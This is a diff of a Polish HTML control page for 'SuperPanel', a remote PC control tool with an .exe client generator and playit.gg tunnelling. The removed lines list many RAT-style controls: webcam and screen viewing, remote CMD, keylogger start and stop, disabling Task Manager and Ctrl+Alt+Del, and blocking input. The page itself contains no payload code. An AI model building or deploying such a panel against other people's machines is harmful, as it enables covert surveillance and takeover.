@@ -2,7 +2,7 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <title>Zdalna Kontrola PC - SuperPanel</title>
+    <title>Zdalna Kontrola PC – SuperPanel</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
@@ -10,121 +10,104 @@
 </head>
 <body>
     <main>
-        <section id="loginSection">
-            <h2>Połącz się z komputerem</h2>
-            <input type="text" id="keyInput" placeholder="Wpisz klucz">
-            <button onclick="login()">Połącz</button>
-            <div id="loginError"></div>
-        </section>
+        <nav>
+            <span class="logo">🖥️ SuperPanel</span>
+            <a href="#" onclick="showTab('control')">Kontrola</a>
+            <a href="#" onclick="showTab('build')">Generator .exe</a>
+            <a href="#" onclick="showTab('playit')">playit.gg</a>
+            <a href="#" onclick="showTab('about')">O projekcie</a>
+        </nav>
 
-        <section id="controlSection" style="display:none;">
-            <h2>Zdalna kontrola (50+ funkcji)</h2>
-            <div id="livePreview">
-                <h3>Podgląd ekranu</h3><img id="screenImg" width="800">
-                <h3>Podgląd kamerki</h3><img id="cameraImg" width="320">
+        <!-- Kontrola PC -->
+        <section id="controlTab" class="tab">
+            <h2>Połącz się z komputerem</h2>
+            <div class="form-row">
+                <input type="text" id="keyInput" placeholder="Wpisz klucz">
+                <button onclick="login()">Połącz</button>
+                <span id="loginError"></span>
             </div>
-            <div id="functionsPanel">
-                <h3>Funkcje sterowania</h3>
-                <div class="grid">
-                    <!-- 1-10 -->
-                    <button onclick="send('screen_live')">Podgląd ekranu</button>
-                    <button onclick="send('camera_live')">Podgląd kamerki</button>
-                    <button onclick="send('open_url',{url:getUrl()})">Otwórz stronę</button>
-                    <input type="text" id="urlInput" placeholder="URL">
-                    <button onclick="send('mouse_left')">Lewy klik</button>
-                    <button onclick="send('mouse_right')">Prawy klik</button>
-                    <button onclick="send('mouse_double')">Dwuklik</button>
-                    <button onclick="send('mouse_move',{x:getX(),y:getY()})">Przesuń mysz</button>
-                    <input type="number" id="xInput" placeholder="X">
-                    <input type="number" id="yInput" placeholder="Y">
-                    <!-- 11-20 -->
-                    <button onclick="send('type_text',{text:getText()})">Wpisz tekst</button>
-                    <input type="text" id="txtInput" placeholder="Tekst">
-                    <button onclick="send('lock')">Blokuj ekran</button>
-                    <button onclick="send('unlock')">Odblokuj ekran</button>
-                    <button onclick="send('shutdown')">Wyłącz</button>
-                    <button onclick="send('restart')">Restart</button>
-                    <button onclick="send('run_program',{program:getProgram()})">Uruchom program</button>
-                    <input type="text" id="programInput" placeholder="Nazwa programu">
-                    <button onclick="send('screenshot')">Screenshot</button>
-                    <button onclick="send('send_file',{filename:getFileName(),filedata:getFileData()})">Wyślij plik</button>
-                    <input type="file" id="fileInput">
-                    <!-- 21-30 -->
-                    <button onclick="send('get_file',{filename:getFileName()})">Pobierz plik</button>
-                    <button onclick="send('notify',{title:'Info',msg:'Test'})">Powiadomienie</button>
-                    <button onclick="send('get_windows')">Aktywne okna</button>
-                    <button onclick="send('get_stats')">Statystyki (CPU/RAM/Bateria)</button>
-                    <button onclick="send('volume_up')">Głośność +</button>
-                    <button onclick="send('volume_down')">Głośność -</button>
-                    <button onclick="send('mute')">Mute</button>
-                    <button onclick="send('cmd',{cmd:getCmd()})">Wykonaj CMD</button>
-                    <input type="text" id="cmdInput" placeholder="Polecenie CMD">
-                    <button onclick="send('chat',{msg:getChat()})">Czat z PC</button>
-                    <input type="text" id="chatInput" placeholder="Wiadomość">
-                    <!-- 31-40 -->
-                    <button onclick="send('system_beep')">System beep</button>
-                    <button onclick="send('change_resolution',{width:getWidth(),height:getHeight()})">Zmień rozdzielczość podglądu</button>
-                    <input type="number" id="widthInput" placeholder="Szerokość">
-                    <input type="number" id="heightInput" placeholder="Wysokość">
-                    <button onclick="send('wifi_on')">Włącz Wi-Fi</button>
-                    <button onclick="send('wifi_off')">Wyłącz Wi-Fi</button>
-                    <button onclick="send('bluetooth_on')">Włącz Bluetooth</button>
-                    <button onclick="send('bluetooth_off')">Wyłącz Bluetooth</button>
-                    <button onclick="send('list_files',{folder:getFolder()})">Lista plików</button>
-                    <input type="text" id="folderInput" placeholder="Folder">
-                    <button onclick="send('delete_file',{filename:getFileName()})">Usuń plik</button>
-                    <!-- 41-50 -->
-                    <button onclick="send('create_folder',{folder:getFolder()})">Utwórz folder</button>
-                    <button onclick="send('create_file',{filename:getFileName(),content:getText()})">Utwórz plik</button>
-                    <button onclick="send('rename_file',{old:getFileName(),new:getNewFileName()})">Zmień nazwę pliku</button>
-                    <input type="text" id="newFileNameInput" placeholder="Nowa nazwa pliku">
-                    <button onclick="send('set_wallpaper',{filename:getFileName()})">Ustaw tapetę</button>
-                    <button onclick="send('alert',{text:getAlertText()})">Alert na pulpicie</button>
-                    <input type="text" id="alertInput" placeholder="Tekst alertu">
-                    <button onclick="send('special_key',{key:getSpecialKey()})">Wyślij klawisz specjalny</button>
-                    <input type="text" id="specialKeyInput" placeholder="np. Ctrl+C">
-                    <button onclick="send('logoff')">Wyloguj użytkownika</button>
-                    <button onclick="send('block_usb')">Blokuj porty USB</button>
-                    <button onclick="send('unblock_usb')">Odblokuj USB</button>
-                    <button onclick="send('camera_on')">Włącz kamerę</button>
-                    <button onclick="send('camera_off')">Wyłącz kamerę</button>
-                    <button onclick="send('update_app')">Aktualizuj aplikację</button>
-                    <button onclick="send('silent_mode')">Tryb cichy</button>
-                    <button onclick="send('record_screen')">Nagrywaj ekran</button>
-                    <button onclick="send('record_audio')">Nagrywaj dźwięk</button>
-                    <button onclick="send('set_brightness',{value:getBrightness()})">Jasność ekranu</button>
-                    <input type="number" id="brightnessInput" placeholder="0-100">
-                    <button onclick="send('get_temperature')">Temperatura CPU/GPU</button>
-                    <button onclick="send('night_mode')">Tryb nocny</button>
-                    <button onclick="send('fan_control',{value:getFan()})">Steruj wentylatorem</button>
-                    <input type="number" id="fanInput" placeholder="RPM">
-                    <button onclick="send('process_list')">Lista procesów</button>
-                    <button onclick="send('kill_process',{pid:getPID()})">Zabij proces</button>
-                    <input type="number" id="pidInput" placeholder="PID">
-                    <button onclick="send('start_process',{program:getProgram()})">Start procesu</button>
-                    <button onclick="send('clipboard_copy',{text:getText()})">Kopiuj do schowka</button>
-                    <button onclick="send('remote_copy',{filename:getFileName(),dest:getDest()})">Kopiuj plik</button>
-                    <input type="text" id="destInput" placeholder="Ścieżka docelowa">
-                    <button onclick="send('timer_lock',{seconds:getSeconds()})">Zablokuj komputer po czasie</button>
-                    <input type="number" id="secondsInput" placeholder="Sekundy">
-                    <!-- Dodane funkcje -->
-                    <button onclick="send('monitor_user_activity')">Monitoruj aktywność użytkownika</button>
-                    <button onclick="send('disable_task_manager')">Wyłącz Task Manager</button>
-                    <button onclick="send('enable_task_manager')">Włącz Task Manager</button>
-                    <button onclick="send('disable_ctrl_alt_del')">Blokuj Ctrl+Alt+Del</button>
-                    <button onclick="send('enable_ctrl_alt_del')">Odblokuj Ctrl+Alt+Del</button>
-                    <button onclick="send('hide_desktop_icons')">Ukryj ikony na pulpicie</button>
-                    <button onclick="send('show_desktop_icons')">Pokaż ikony na pulpicie</button>
-                    <button onclick="send('block_internet')">Blokuj Internet</button>
-                    <button onclick="send('unblock_internet')">Odblokuj Internet</button>
-                    <button onclick="send('block_keyboard')">Blokuj klawiaturę</button>
-                    <button onclick="send('unblock_keyboard')">Odblokuj klawiaturę</button>
-                    <button onclick="send('block_mouse')">Blokuj mysz</button>
-                    <button onclick="send('unblock_mouse')">Odblokuj mysz</button>
-                    <button onclick="send('start_keylogger')">Start Keylogger</button>
-                    <button onclick="send('stop_keylogger')">Stop Keylogger</button>
+            <div id="controlSection" style="display:none;">
+                <div id="livePreview">
+                    <div>
+                        <h3>Podgląd ekranu</h3>
+                        <img id="screenImg" width="800">
+                    </div>
+                    <div>
+                        <h3>Podgląd kamerki</h3>
+                        <img id="cameraImg" width="320">
+                    </div>
+                </div>
+                <div id="functionsPanel">
+                    <h3>Funkcje sterowania (50+)</h3>
+                    <div class="grid">
+                        <!-- Przykładowe funkcje, reszta w app.js -->
+                        <button onclick="send('mouse_left')">Lewy klik</button>
+                        <button onclick="send('mouse_right')">Prawy klik</button>
+                        <button onclick="send('mouse_double')">Dwuklik</button>
+                        <button onclick="send('mouse_move',{x:getX(),y:getY()})">Przesuń mysz</button>
+                        <input type="number" id="xInput" placeholder="X">
+                        <input type="number" id="yInput" placeholder="Y">
+                        <button onclick="send('type_text',{text:getText()})">Wpisz tekst</button>
+                        <input type="text" id="txtInput" placeholder="Tekst">
+                        <button onclick="send('open_url',{url:getUrl()})">Otwórz stronę</button>
+                        <input type="text" id="urlInput" placeholder="URL">
+                        <button onclick="send('run_program',{program:getProgram()})">Uruchom program</button>
+                        <input type="text" id="programInput" placeholder="Nazwa programu">
+                        <button onclick="send('screenshot')">Screenshot</button>
+                        <button onclick="send('shutdown')">Wyłącz</button>
+                        <button onclick="send('restart')">Restart</button>
+                        <button onclick="send('lock')">Blokuj ekran</button>
+                        <button onclick="send('unlock')">Odblokuj ekran</button>
+                        <button onclick="send('send_file',{filename:getFileName(),filedata:getFileData()})">Wyślij plik</button>
+                        <input type="file" id="fileInput">
+                        <button onclick="send('get_file',{filename:getFileName()})">Pobierz plik</button>
+                        <button onclick="send('notify',{title:'Info',msg:'Test'})">Powiadomienie</button>
+                        <button onclick="send('get_windows')">Aktywne okna</button>
+                        <button onclick="send('get_stats')">Statystyki</button>
+                        <button onclick="send('volume_up')">Głośność +</button>
+                        <button onclick="send('volume_down')">Głośność -</button>
+                        <button onclick="send('mute')">Mute</button>
+                        <button onclick="send('cmd',{cmd:getCmd()})">Wykonaj CMD</button>
+                        <input type="text" id="cmdInput" placeholder="Polecenie CMD">
+                        <button onclick="send('chat',{msg:getChat()})">Czat z PC</button>
+                        <input type="text" id="chatInput" placeholder="Wiadomość">
+                        <!-- Dodaj kolejne funkcje według wzoru -->
+                    </div>
+                    <div id="statusBox"></div>
                 </div>
             </div>
+        </section>
+
+        <!-- Generator .exe -->
+        <section id="buildTab" class="tab" style="display:none;">
+            <h2>Stwórz swój program .exe!</h2>
+            <p>Wygeneruj spersonalizowanego klienta .exe z własnym kluczem – uruchom na swoim PC, a potem kontroluj z tej strony!</p>
+            <div class="form-row">
+                <input type="text" id="genKeyInput" placeholder="Klucz (opcjonalnie)">
+                <button onclick="generateExe()">Pobierz .exe</button>
+            </div>
+            <div id="exeStatus"></div>
+        </section>
+
+        <!-- playit.gg -->
+        <section id="playitTab" class="tab" style="display:none;">
+            <h2>Hostowanie przez playit.gg</h2>
+            <p>
+                <b>Krok 1:</b> <a href="https://playit.gg/download" target="_blank">Pobierz playit.gg</a><br>
+                <b>Krok 2:</b> Utwórz tunel na port <b>3000</b> (serwer Node.js)<br>
+                <b>Krok 3:</b> Skopiuj <b>host:port</b> i podaj go jako adres backendu w panelu.<br>
+                <b>Krok 4:</b> Możesz teraz sterować komputerem z dowolnego miejsca!
+            </p>
+        </section>
+
+        <!-- O projekcie -->
+        <section id="aboutTab" class="tab" style="display:none;">
+            <h2>O projekcie</h2>
+            <p>
+                SuperPanel to nowoczesny system zdalnej kontroli komputera – podgląd ekranu, kamerki, 50+ funkcji, integracja z Discordem i automatyczny autostart klienta.<br>
+                Kod frontend jest całkowicie hostowalny na GitHub Pages. Backend (Node.js) oraz klient .exe hostuj na własnym serwerze.<br>
+                <b>Projekt open-source!</b>
+            </p>
         </section>
     </main>
 </body>
